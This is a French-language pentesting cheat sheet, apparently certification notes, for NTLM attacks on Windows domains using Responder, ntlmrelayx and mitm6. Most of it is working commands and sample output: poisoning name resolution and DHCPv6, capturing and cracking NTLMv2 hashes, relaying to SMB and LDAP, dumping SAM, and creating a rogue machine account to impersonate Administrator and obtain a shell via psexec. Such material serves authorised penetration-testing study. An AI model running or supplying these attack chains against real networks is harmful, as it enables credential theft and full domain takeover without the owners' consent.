# Responder & mitm6 — Référence complète

---

## Responder

### Le concept

Responder empoisonne les protocoles de résolution de noms **LLMNR**, **NBT-NS** et **mDNS**. Quand une machine cherche un nom qui n'existe pas en DNS, Responder répond "c'est moi !" et capture les **authentifications NTLM** qui s'ensuivent.

```
Résolution de nom Windows :
1. Cache local
2. DNS
3. LLMNR  ← broadcast réseau local (Responder répond ici)
4. NBT-NS ← broadcast réseau local (Responder répond ici)
```

### Modes d'utilisation

```bash
# Mode actif standard (capturer les hashes)
sudo responder -I $IFACE -rdw

# Mode analyse uniquement (observer sans capturer)
sudo responder -I $IFACE -A

# Pour le relay : désactiver SMB et HTTP
# Éditer /etc/responder/Responder.conf → SMB = Off, HTTP = Off
sudo responder -I $IFACE -rdw

# Options :
# -I    Interface réseau
# -r    Répondre aux requêtes NBT-NS pour noms NetBIOS
# -d    Répondre aux requêtes DHCP
# -w    Démarrer le serveur WPAD (proxy auto-discovery)
# -A    Mode analyse (passive — ne répond pas)
# -v    Mode verbeux
```

### Logs et hashes capturés

```bash
# Logs dans
ls /usr/share/responder/logs/

# Voir les hashes capturés
tail -f /usr/share/responder/logs/Responder-Session.log

# Lister tous les hashes NTLMv2
ls /usr/share/responder/logs/*.txt

# Cracker les hashes
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt \
    /usr/share/wordlists/rockyou.txt

john --format=netntlmv2 \
    /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt \
    --wordlist=/usr/share/wordlists/rockyou.txt
```

### Format des hashes capturés

```
alice::ENTREPRISE:1122334455667788:AABBCCDDEEFF...:0101000000000000...
^^^^^  ^^^^^^^^^^  ^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
user   domain      challenge         response
```

> ⚠️ Ce format **NTLMv2 réseau** n'est PAS utilisable en Pass-the-Hash direct. Il faut le cracker ou le relayer.

### Configuration Responder.conf

```bash
sudo nano /etc/responder/Responder.conf

# Pour le relay (désactiver les serveurs locaux)
# SMB = Off
# HTTP = Off

# Pour capturer uniquement (mode normal)
# SMB = On
# HTTP = On
```

---

## ntlmrelayx (Impacket)

### Usage basique

```bash
# Relay vers liste de cibles (dump SAM si admin)
ntlmrelayx.py -tf ~/certif/targets_relay.txt -smb2support

# Relay avec mode SOCKS (pour utiliser via proxychains après)
ntlmrelayx.py -tf ~/certif/targets_relay.txt -smb2support -socks

# Relay vers LDAP
ntlmrelayx.py -t ldap://$DC_IP --no-da --no-acl

# Relay vers LDAPS avec création de compte machine (pour RBCD)
ntlmrelayx.py -t ldaps://$DC_IP --delegate-access --add-computer

# Relay IPv6 (avec mitm6)
ntlmrelayx.py -6 -socks -t ldap://$DC_IP -smb2support \
              -tf ~/certif/targets_relay.txt
```

### Mode SOCKS — Utilisation via proxychains

```bash
# Dans ntlmrelayx, taper "socks" pour voir les relais actifs
> socks
Protocol  Target         Username                        AdminStatus  Port
--------  -------------  ------------------------------  -----------  ----
SMB       192.168.X.20   ENTREPRISE/alice                TRUE         445

# Configurer proxychains
sudo nano /etc/proxychains4.conf
# Dernière ligne : socks5  127.0.0.1  1080

# Utiliser via proxychains
proxychains -q psexec.py "$DOMAIN/$USER@$TARGET" -no-pass
proxychains -q nxc smb $TARGET -u $USER -p '' -d $DOMAIN
proxychains -q secretsdump.py $DOMAIN/$USER@$TARGET -no-pass
```

---

## mitm6

### Le concept

Windows a IPv6 activé par défaut mais sans infrastructure DHCPv6 dans la plupart des entreprises. `mitm6` se déclare comme serveur DHCPv6, devient le serveur DNS des victimes, et peut rediriger leurs authentifications vers l'attaquant.

```
Victimes Windows demandent : "Y a-t-il un serveur DHCPv6 ?"
mitm6 répond : "Oui, c'est moi ! Voici votre config IPv6 + DNS"
Victimes configurent mitm6 comme serveur DNS
mitm6 peut rediriger les authentifications NTLM vers ntlmrelayx
```

### Lancement

```bash
# Terminal 1 — mitm6
sudo mitm6 -d $DOMAIN_FQDN -i $IFACE

# Options :
# -d    Domaine cible (filtre les victimes)
# -i    Interface réseau
# -hw   Whitelist hardware addresses (limiter aux cibles)
```

### Combinaison complète mitm6 + ntlmrelayx (Terminal 2)

```bash
# Relay vers LDAP pour créer un compte avec RBCD
ntlmrelayx.py -6 \
    -t ldaps://$DC_IP \
    -wh attacker-wpad \
    --delegate-access \
    --add-computer

# Relay vers LDAP + SOCKS
ntlmrelayx.py -6 \
    -socks \
    -t ldap://$DC_IP \
    -smb2support \
    -tf ~/certif/targets_relay.txt

# Pour récupérer des hashes de machines (pas juste users)
ntlmrelayx.py -6 \
    -t smb://$TARGET \
    -smb2support
```

---

## Workflow complet : Responder → Relay → Accès

### Scénario 1 : Capture + crack

```bash
# Terminal 1 : Responder actif
sudo responder -I $IFACE -rdw

# Attendre la capture, puis :
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2*.txt \
    /usr/share/wordlists/rockyou.txt

# Si cracké :
nxc smb $RANGE -u $USER -p $CRACKED_PWD -d $DOMAIN
```

### Scénario 2 : Relay SMB

```bash
# Terminal 1 : Responder (SMB/HTTP off)
sudo responder -I $IFACE -rdw   # après avoir mis SMB=Off HTTP=Off dans conf

# Terminal 2 : ntlmrelayx
ntlmrelayx.py -tf ~/certif/targets_relay.txt -smb2support -socks

# Quand un relay succeed :
# Dans ntlmrelayx → taper "socks" pour voir la session
# Utiliser via proxychains
```

### Scénario 3 : MITMv6 → relay LDAP → RBCD

```bash
# Terminal 1 : mitm6
sudo mitm6 -d $DOMAIN_FQDN -i $IFACE

# Terminal 2 : ntlmrelayx
ntlmrelayx.py -6 -t ldaps://$DC_IP \
    --delegate-access --add-computer

# Résultat : un compte machine EVIL$ créé + RBCD configuré
# Suite : getST.py pour impersonner Administrator
getST.py -spn 'cifs/target.entreprise.local' \
         -impersonate Administrator \
         $DOMAIN/EVIL\$:'EvilPass123!'

export KRB5CCNAME=$PWD/Administrator.ccache
psexec.py -k -no-pass target.entreprise.local
```

---

## Indicateurs de succès

```
Responder :
[SMB] NTLMv2-SSP Client   : 192.168.X.XX
[SMB] NTLMv2-SSP Username : DOMAIN\username
[SMB] NTLMv2-SSP Hash     : username::DOMAIN:...

ntlmrelayx (relay réussi) :
[*] Authenticating against smb://192.168.X.XX as DOMAIN\username SUCCEED
[*] SOCKS: Adding DOMAIN/username@192.168.X.XX(445) to active SOCKS connection

ntlmrelayx (dump SAM) :
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
Administrator:500:aad3b435...:HASH...
```
